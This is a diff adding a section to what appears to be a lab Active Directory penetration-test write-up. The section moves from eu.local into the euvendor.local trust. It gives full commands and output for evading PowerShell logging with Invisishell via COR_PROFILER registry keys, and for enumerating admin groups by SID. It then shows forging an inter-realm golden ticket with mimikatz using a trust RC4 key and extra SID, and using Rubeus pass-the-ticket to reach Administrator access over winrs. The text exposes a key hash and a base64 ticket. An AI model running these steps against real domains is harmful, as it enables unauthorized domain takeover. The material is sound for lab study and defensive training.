@@ -473,3 +473,225 @@ Shared with Domain Admins of eu.local
 ```
 
 ## Access euvendor net using powershell remoting
+
+Accesss to eu-dc.eu.local:
+
+```
+C:\Windows\system32>winrs -r:eu-dc.eu.local cmd
+Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator>hostname
+hostname
+EU-DC
+
+C:\Users\Administrator>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . :
+   Link-local IPv6 Address . . . . . : fe80::f7f9:b2b9:5130:1891%3
+   IPv4 Address. . . . . . . . . . . : 192.168.12.1
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.12.254
+
+
+```
+Run Invisishell and import AD module:
+
+```
+C:\Users\Public\RunWithRegistryNonAdmin.bat
+
+C:\Users\Public>set COR_ENABLE_PROFILING=1
+
+C:\Users\Public>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
+
+C:\Users\Public>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
+The operation completed successfully.
+
+C:\Users\Public>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
+The operation completed successfully.
+
+C:\Users\Public>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "C:\Users\Public\InShellProf.dll" /f
+The operation completed successfully.
+
+C:\Users\Public>powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Public> Import-Module C:\Users\Public\Microsoft.ActiveDirectory.Management.dll
+Import-Module C:\Users\Public\Microsoft.ActiveDirectory.Management.dll
+PS C:\Users\Public> Import-Module C:\Users\Public\ActiveDirectory.psd1
+Import-Module C:\Users\Public\ActiveDirectory.psd1
+```
+
+As we know the SID of the Trust domain: S-1-5-21-4066061358-3942393892-617142613 it's possible looking for groups in the domain with administration privileges upper to -1000:
+```
+PS C:\Users\Public> Get-ADGroup -Filter 'SID -ge "S-1-5-21-4066061358-3942393892-617142613-1000"' -Server euvendor.local
+Get-ADGroup -Filter 'SID -ge "S-1-5-21-4066061358-3942393892-617142613-1000"' -Server euvendor.local
+
+
+DistinguishedName : CN=DnsAdmins,CN=Users,DC=euvendor,DC=local
+GroupCategory     : Security
+GroupScope        : DomainLocal
+Name              : DnsAdmins
+ObjectClass       : group
+ObjectGUID        : 558b62ba-e634-4bda-91cf-9d6e9c9aaee8
+SamAccountName    : DnsAdmins
+SID               : S-1-5-21-4066061358-3942393892-617142613-1101
+
+DistinguishedName : CN=DnsUpdateProxy,CN=Users,DC=euvendor,DC=local
+GroupCategory     : Security
+GroupScope        : Global
+Name              : DnsUpdateProxy
+ObjectClass       : group
+ObjectGUID        : 8b8804e3-3914-49c3-8b51-562c0644d60d
+SamAccountName    : DnsUpdateProxy
+SID               : S-1-5-21-4066061358-3942393892-617142613-1102
+
+DistinguishedName : CN=EUAdmins,CN=Users,DC=euvendor,DC=local
+GroupCategory     : Security
+GroupScope        : Global
+Name              : EUAdmins
+ObjectClass       : group
+ObjectGUID        : 1dad0633-fcf5-49dc-9431-8b167cf36969
+SamAccountName    : euadmins
+SID               : S-1-5-21-4066061358-3942393892-617142613-1103
+
+```
+Using the same technique that in the previous section it's possible create a new Kerberos intra-golden for this service:
+
+```
+
+PS C:\Users\Public> C:\Users\Public\mimikatz.exe
+C:\Users\Public\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:93172cd5469514038b20ce9088ed63ea /service:krbtgt /target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /ticket:C:\Users\Public\euvendornet.kirbi
+User      : Administrator
+Domain    : eu.local (EU)
+SID       : S-1-5-21-3657428294-2017276338-1274645009
+User Id   : 500
+Groups Id : *513 512 520 518 519
+Extra SIDs: S-1-5-21-4066061358-3942393892-617142613-1103 ;
+ServiceKey: 93172cd5469514038b20ce9088ed63ea - rc4_hmac_nt
+Service   : krbtgt
+Target    : euvendor.local
+Lifetime  : 3/4/2023 8:52:18 AM ; 3/1/2033 8:52:18 AM ; 3/1/2033 8:52:18 AM
+-> Ticket : C:\Users\Public\euvendornet.kirbi
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Final Ticket Saved to file !
+
+mimikatz # exit
+```
+
+with the exported ticket, it's possible perform a rubeus ptt on the target server euvendor-net and access to te target server with Administrator privileges using winrs:
+
+```
+C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\euvendornet.kirbi /service:HTTP/euvendor-net.euvendor.local /dc:euvendor-dc.euvendor.local /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.1
+
+[*] Action: Ask TGS
+
+[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
+[*] Building TGS-REQ request for: 'HTTP/euvendor-net.euvendor.local'
+[*] Using domain controller: euvendor-dc.euvendor.local (192.168.12.212)
+[+] TGS request successful!
+[+] Ticket successfully imported!
+[*] base64(ticket.kirbi):
+
+      doIFOjCCBTagAwIBBaEDAgEWooIELzCCBCthggQnMIIEI6ADAgEFoRAbDkVVVkVORE9SLkxPQ0FMoi4w
+      LKADAgECoSUwIxsESFRUUBsbZXV2ZW5kb3ItbmV0LmV1dmVuZG9yLmxvY2Fso4ID2DCCA9SgAwIBEqED
+      AgEBooIDxgSCA8JtXcbUQVImDuwF3tkdlkhO6NkBT1MlK88xqxrv66COPUpvV3Hnaq63cNVCS91YrL5L
+      dvvd0Af5wHrfqHfgVLSbTd66iTiKp/aDYLDyuiGp1QUDE6X6ij9uVUWCcrcay2dz7FhIWNllb4vGWeFE
+      h8/h8UW7TiCLIfNu0K/A0hacixIixHZjTxi2VCmUdaEohhzcAz6B8YAjkcrAImWOjyslMAuSMcmAPnoa
+      Hc+cTA3L5+6ykfFk4Y28g9qNAfPvF+GqrwOcVY5gIAj8vqyQrBfzBGozyw52FGPsmCSlVvnzK8nqQVeF
+      LEyYQF66UGz7m43JOfNV8unL9sCS9CxhaqlIq3CmiG2EffQAUhxSm+QqH+9p75WqoP5v/9usruXXslqr
+      JwiynwKxqqvVEmT+3pWccUKjuLjRELmF2z5EFtWHFAg8ZB4ZT3939Y1by1a1LfVAHGz5/85TsaLn6zBm
+      H/ODsOIwJvfS15pGC7qdWZhdmBpVBgulzSF7RldeS18ZzUTFixekFBR6wxj0Fd/aMANN6Hm/OOYrjlLq
+      4NjVwSyXk64HCxnkdGovxTaNxlf/L+7mXk2FSDHVaCJnR8+eH4iS6YzTgjtztq7vIm8ymTF/pkf/v3LK
+      3hqit9snUN4kv/vGCBd5UWonTDYDv6MdslxI1zb5XVs4fAj1p8ZdZyvFhUroiKrRQ3V4SLSXECw4AV6Z
+      kzWMLidtkFtXfg597iQ+VB3uDDoUnloeveRCbWIuvBr92qgfniqfQ8U+hxZ9Xa0Ak+XP+GEo9+q+ADrt
+      7mtWRgx0FEJrgE9S0ZUshD15XESI6BDaZypntXwazvjou5RvRAYKC9w88Vi+DtH9JnNRKKrvP7pWSxk7
+      KQ7Zl3fFYzLViFAVmKF3xV8fd0t7t8+1m3PnV/0+2B7iIXp5FbeW/EDHIFXpdCzYdwHLk51Q1u3pD6jg
+      dy9yUKwbfJUPDeShvfajhooAjq1jeCgB2lcCLA1HLqZxsz7TElZf8oeD8owy8aJ51PU2SbKGmgUFk/Gl
+      DUU6GOsvl47otVc0lyPm22yFFZU1EBz1RO10y1HVn2LT4+AYHiotDBNIySj5sCjd6328LKevEmcyZki9
+      AgElrH1m4RL822/k1EuPTSG88Sl5Ken+kg1a4gdkwEbRMt2Sig6dX3YbZKYJ6F6j4DAXvGX6orsAk43f
+      O5TzjUctkW5jkRBUcWmcPvQujfvY8XkTA4vXYQytN5k1Hs0/hnH2qPcPMCAMPdKNOFuGRvCZoDiGITbZ
+      75hB8aZFFy79fMX9UqOB9jCB86ADAgEAooHrBIHofYHlMIHioIHfMIHcMIHZoCswKaADAgESoSIEIBw/
+      /yln1ZfCEauABmgILAUk3t4seIFTIJd6iU8g6o4goQobCGV1LmxvY2FsohowGKADAgEBoREwDxsNQWRt
+      aW5pc3RyYXRvcqMHAwUAQKEAAKURGA8yMDIzMDMwNDE2NTQxOFqmERgPMjAyMzAzMDUwMjU0MThapxEY
+      DzIwMjMwMzExMTY1NDE4WqgQGw5FVVZFTkRPUi5MT0NBTKkuMCygAwIBAqElMCMbBEhUVFAbG2V1dmVu
+      ZG9yLW5ldC5ldXZlbmRvci5sb2NhbA==
+
+  ServiceName              :  HTTP/euvendor-net.euvendor.local
+  ServiceRealm             :  EUVENDOR.LOCAL
+  UserName                 :  Administrator
+  UserRealm                :  eu.local
+  StartTime                :  3/4/2023 8:54:18 AM
+  EndTime                  :  3/4/2023 6:54:18 PM
+  RenewTill                :  3/11/2023 8:54:18 AM
+  Flags                    :  name_canonicalize, pre_authent, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  HD//KWfVl8IRq4AGaAgsBSTe3ix4gVMgl3qJTyDqjiA=
+
+
+```
+
+Validate tickets:
+
+```
+#3>     Client: Administrator @ eu.local
+        Server: HTTP/euvendor-net.euvendor.local @ EUVENDOR.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
+        Start Time: 3/4/2023 8:54:18 (local)
+        End Time:   3/4/2023 18:54:18 (local)
+        Renew Time: 3/11/2023 8:54:18 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called:
+```
+
+And finally access:
+
+```
+C:\Users\Public>winrs -r:euvendor-net.euvendor.local cmd
+winrs -r:euvendor-net.euvendor.local cmd
+Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator.EU>whoami
+whoami
+eu\administrator
+
+C:\Users\Administrator.EU>hostname
+hostname
+EUVendor-Net
+
+C:\Users\Administrator.EU>
+```
